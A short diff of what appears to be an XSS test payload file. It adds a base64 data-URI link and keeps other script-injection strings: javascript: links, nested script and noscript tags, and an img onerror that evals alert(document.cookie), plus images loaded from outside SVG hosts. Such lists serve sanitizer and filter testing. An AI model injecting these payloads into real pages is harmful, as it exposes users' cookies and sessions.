@@ -2,6 +2,8 @@
 <noscript onerror=prompt(0);><a href="javascript:alert("XSS")>XSS</a>"><script onerror="<noscript onerror="<script>alert("XSS")</script>"><IMG src=<script src="/">alert(" "XSS" ")</script></noscript>"<script>alert("XSS")</script></noscript>
 </output>
 <a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>
+<a href="data:text/plain;base64,amF2YXNjcmlwdDphbGVydCgneHNzJyk=">Click data</a>
+
 https://special-garbanzo-7v7r6x5g5v4hpgpq-8080.app.github.dev/super.svg
 <img src="https://gistpreview.github.io/?029781441a2d3737294741f2d6a4c821/image8.svg" onerror="eval('alert(document.cookie)')"/>
 <IMG SRC="https://special-garbanzo-7v7r6x5g5v4hpgpq-8080.app.github.dev/super.svg">
